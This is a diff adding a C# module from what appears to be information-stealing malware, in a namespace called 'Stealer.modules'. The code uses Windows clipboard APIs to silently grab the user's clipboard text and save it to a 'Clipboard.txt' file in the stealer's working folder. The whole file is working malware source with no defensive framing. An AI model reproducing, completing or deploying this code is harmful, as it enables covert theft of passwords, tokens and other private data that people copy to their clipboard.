@@ -1,0 +1,55 @@
+﻿using System;
+using System.IO;
+using System.Runtime.InteropServices;
+
+namespace Stealer.modules
+{
+  internal class Clipboard
+  {
+    [DllImport("user32.dll")]
+    private static extern bool IsClipboardFormatAvailable(uint format);
+
+    [DllImport("user32.dll", SetLastError = true)]
+    private static extern bool OpenClipboard(IntPtr hWndNewOwner);
+
+    [DllImport("user32.dll")]
+    private static extern IntPtr GetClipboardData(uint uFormat);
+
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GlobalLock(IntPtr hMem);
+
+    [DllImport("kernel32.dll")]
+    private static extern bool GlobalUnlock(IntPtr hMem);
+
+    [DllImport("user32.dll", SetLastError = true)]
+    private static extern bool CloseClipboard();
+
+    public static string GetText()
+    {
+      string str = Program.path + "\\";
+      if (Clipboard.IsClipboardFormatAvailable(13U) && Clipboard.OpenClipboard(IntPtr.Zero))
+      {
+        string contents = string.Empty;
+        IntPtr clipboardData = Clipboard.GetClipboardData(13U);
+        if (!clipboardData.Equals((object) IntPtr.Zero))
+        {
+          IntPtr num = Clipboard.GlobalLock(clipboardData);
+          if (!num.Equals((object) IntPtr.Zero))
+          {
+            try
+            {
+              contents = Marshal.PtrToStringUni(num);
+              Clipboard.GlobalUnlock(num);
+            }
+            catch
+            {
+            }
+          }
+        }
+        Clipboard.CloseClipboard();
+        File.WriteAllText(str + "Clipboard.txt", contents);
+      }
+      return (string) null;
+    }
+  }
+}
